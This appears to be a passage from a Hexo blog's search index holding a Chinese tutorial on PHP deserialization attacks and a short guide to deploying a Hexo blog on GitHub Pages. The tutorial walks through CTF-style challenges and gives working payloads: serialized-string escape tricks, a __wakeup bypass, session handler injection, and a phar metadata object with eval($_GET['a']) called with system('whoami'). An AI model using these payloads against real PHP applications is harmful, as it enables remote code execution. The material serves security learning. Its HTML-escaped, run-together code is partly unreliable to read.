-&lt;?phpclass Test&#123;	public $a;	public $b = &#x27;abcsystem&#x27;;	public $c;&#125;$str = serialize(new Test());/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;c&quot;;N;&#125;&#x27;*/$str = str_replace(&#x27;system&#x27;,&quot;&quot;,$str);/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:*/&quot;abc&quot;;s:1:&quot;&quot;/*&quot;c&quot;;N;&#125;&#x27;*/ //没注释的地方是会被当成$b的值的地方var_dump(unserialize($str));?&gt;
-
-
-
-就是构造成员变量的值，在str_replace()的时候，能刚好吃掉不想要的，能够构造我们的命令
-先把我们要执行的命令写好，这样便于构造长度
-//eg&lt;?phpclass Test&#123;	public $a = &#x27;abcsystem&#x27;;	public $b = &#x27;构造的表达式&#x27;;&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;b&quot;;s:?:&quot;构造的表达式&quot;;&#125;&#x27;;//要吃到构造的表达式所处的第一个&quot;?&gt;/*19个字符要3个system*/&lt;?phpclass Test&#123;	public $a = &#x27;abcsystemsystemsystem&#x27;;	public $b = &#x27;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;//用;&#125;直接截断&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abcsystemsystemsystem&quot;;s:1:&quot;b&quot;;s:37:&quot;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;//截到构造的表达式前只有19个字符，还要再在构造的表达式前补上2个字符(21 - 19 = 2)和&quot;;$str = str_replace(&#x27;system&#x27;,&#x27;&#x27;,$str);$str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;  /*object(Test)#1 (2) &#123;  [&quot;a&quot;]=&gt;  string(21) &quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;  [&quot;b&quot;]=&gt;  string(20) &quot;echo &quot;hello world!&quot;;&quot;&#125;*/
-
-例题&lt;?phperror_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hk&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass;	var $vip = false;	function __construct($user, $pass)	&#123;		$this-&gt;user = $user;		$this-&gt;pass = $pass;	&#125;&#125;$param = $_GET[&#x27;user&#x27;];$pass = $_GET[&#x27;pass&#x27;];$param = serialize(new test($param, $pass));$profile = unserialize(filter($param));if ($profile-&gt;vip) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;
-
-思路,三个属性,构造第一个属性,使它能吃掉剩下属性的值,在第二个属性中构造表达式使vip=true
-&lt;?phpclass test&#123;	var $user = &quot;php&quot;;	var $pass = &quot;&quot;;	var $vip;&#125;echo serialize(new test());?&gt;//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:3:&quot;php&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;s:3:&quot;vip&quot;;N;&#125;/*从user值吃到pass值的前一个&quot;,需要18个字符(除去最开始的php),php经过filter变成hk减少一个字符,一共需要18个php才能正确吃完让$user = 18个php让$pass = &quot;;s:4:&quot;pass&quot;;N;s:3:&quot;vip&quot;;b:1;&#125;构造url,得到flag*/
-
-
-增多
-用str_replace(),替换成一个更长的字符串，把多余的字符吐出来
-&lt;?phpclass Test&#123;	public $a = &#x27;a&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();$str = serialize($a);//&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;$str = str_replace(&#x27;a&#x27;,&#x27;aaa&#x27;,$str);// echo &quot;$str\n&quot;;/*&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a*/aa/*&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;*/ //多出来的aa就是吐出的多余代码?&gt;
-
-思路：把吐出来的多余代码构造成功能性代码
-构造的字符串:&quot;;s:1:&quot;b&quot;:s:?:&quot;&quot;;&#125;   用;&#125;结束反序列化，不用管原功能性代码
-构造的字符串长度为x，将ls替换成pwd会吐一个字符出来，需要x个pwd，这样就能吐x个字符出来，与前面长度正确对应，功能性代码被正确吐出
-
-class Test&#123;	public $a = &#x27;ls&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();echo serialize($a).&quot;\n&quot;;?&gt;/*想构造一个显示hello world,构造字符串&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125; 长度为39将ls用pwd替换,吐出一个字符,所以我们需要39个ls,替换后才能吐出39个字符,让功能性代码正确吐出*/&lt;?phpclass Test&#123;	public $a = &#x27;lslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslsls&#x27;;//39个ls	public $b = &#x27;b&#x27;;&#125;$a = new Test();$hacker = &#x27;&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;$a-&gt;a = $a-&gt;a.$hacker;$str = serialize($a);echo &quot;$str\n&quot;;$str = str_replace(&#x27;ls&#x27;,&#x27;pwd&#x27;,$str);echo &quot;$str\n&quot;;// &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:114:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;
-
-例题&lt;?php// highlight_file(__FILE__);error_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hack&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass = &#x27;daydream&#x27;;	function __construct($user)	&#123;		$this-&gt;user = $user;	&#125;&#125;$param = $_GET[&#x27;param&#x27;];$param = serialize(new test($param));$profile = unserialize(filter($param));if ($profile-&gt;pass == &#x27;escaping&#x27;) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;
-
-目标:判断pass是否为escaping;用filter将php换成hack达到字符串增多
-目标逃逸代码:&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;,29个字符,所以需要29个php
-构造参数?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22%3Bs%3A4%3A%22pass%22%3Bs%3A8%3A%22escaping%22%3B%7D
-得到flag
-
-wakeup魔术方法绕过
-例题 &lt;?phperror_reporting(0);class secret&#123;    var $file=&#x27;index.php&#x27;;    public function __construct($file)&#123;        $this-&gt;file=$file;    &#125;    function __destruct()&#123;        include_once($this-&gt;file);        echo $flag;    &#125;    function __wakeup()&#123;        $this-&gt;file=&#x27;index.php&#x27;;    &#125;&#125;$cmd=$_GET[&#x27;cmd&#x27;];if (!isset($cmd))&#123;    highlight_file(__FILE__);&#125;else&#123;    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;        echo &quot;Are you daydreaming?&quot;;    &#125;    else&#123;        unserialize($cmd);    &#125;&#125;//sercet in flag.php?&gt;
-
-分析:要绕过__wakeup(),O:后面不能跟数字以绕过正则表达式
-&lt;?phpclass secret&#123;	var $file = &#x27;flag.php&#x27;;&#125;echo serialize(new secret()).&quot;\n&quot;;//获取原序列化字符串echo urlencode(&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;);//在数字前加上+绕过正则表达式,把属性数改大绕过wakeup?&gt;
-
-拿到flag
-
-引用php中引用为 &amp;
-&lt;?phpclass Test&#123;	public $a;	public $b;&#125;$test = new Test();$test-&gt;a = &amp;$test-&gt;b; // a是b的引用echo serialize($test).&quot;\n&quot;;/*O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;*/?&gt;
-
-
-
-例题&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;if (isset($_GET[&#x27;pass&#x27;])) &#123;    $pass = $_GET[&#x27;pass&#x27;];    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);&#125;$o = unserialize($pass);if ($o) &#123;    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)        echo &quot;Congratulation! Here is my secret: &quot;.$flag;    else        echo &quot;Oh no... You can&#x27;t fool me&quot;;&#125;else echo &quot;are you trolling?&quot;;?&gt;
-
-
-这题中传入引用即可
-&lt;?php// highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;$a = new just4fun();$a-&gt;enter = &amp;$a-&gt;secret;echo serialize($a);?&gt;
-
-
-session反序列化漏洞一个页面写入session，一个页面读出session
-
-
-
-
-
-例题no.1
-//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;ben&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 
-
-//读出session&lt;?php highlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class D&#123;    var $a;    function __destruct()&#123;        eval($this-&gt;a);//漏洞所在    &#125;&#125;?&gt; 
-
-以php_serialize方式写入,以php方式读出,php方式键名|序列化字符串,所以构造参数时要加|
-构造参数 ?a=|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
-no.2
-//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 
-
-//读出session&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;    &#125;&#125;?&gt; 
-
-分析:需要用到引用,以php_serialize方式写入session,php方式读出
-构造参数?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;;
-phar反序列化漏洞
-
-重点关注manifest这个字段
-manifest字段格式
-
-24byte后是序列化的字符串
-漏洞原理
-例题no.1
- &lt;?phphighlight_file(__FILE__);class Testobj&#123;    var $output=&#x27;&#x27;;&#125;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; &lt;?phphighlight_file(__FILE__);error_reporting(0);class Testobj&#123;    var $output=&quot;echo &#x27;ok&#x27;;&quot;;    function __destruct()    &#123;        eval($this-&gt;output);    &#125;&#125;if(isset($_GET[&#x27;filename&#x27;]))&#123;    $filename=$_GET[&#x27;filename&#x27;];    var_dump(file_exists($filename));&#125;?&gt; 
-
-分析:phar中manifest的值是对Testobj中$output=eval($_GET[&#39;a&#39;])进行序列化后得到的字符串,反序列化必然会调用__destruct(),相当于eval(eval($_GET[&#39;a&#39;])),执行了eval($_GET[&#39;a&#39;]),所以要传入两个参数,$filename处就可以传入phar伪协议参数,??filename=phar://test.phar&amp;a=system(&#39;whoami&#39;);
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>PHP反序列化</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建自己的GitHub-page</title>
-    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
-    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
-
-
-验证ssh -T git@github.com
-
-
-新建自己的仓库
-
-
-
-
-
-
-
-
-下载git下载链接:https://git-scm.com/downloads/win
-参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
-
-搭建本地博客创建博客目录
-安装hexonpm install -g hexo/cli
-
-
-#创建一个新的hexo项目hexo init myblogs
-
-
-此时的目录结构
-
-
-cd myblogsnpm install
-
-此时项目结构
-
-运行hexo项目
-hexo server
-
-
-部署到github获取个人token
-
-
-
-
-
-
-打开_config.yml
-
-编辑_config.yml
-当前博客目录安装git插件npm install hexo-deployer-git --save
-
-最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
-
-
-博客路径
-博客配置项在_config.yml中
-修改浏览器tab页标题
-
-#部署到githubhexo g -d
-
-
-]]></content>
-      <tags>
-        <tag>杂项</tag>
       </tags>
   </entry>
 </search>
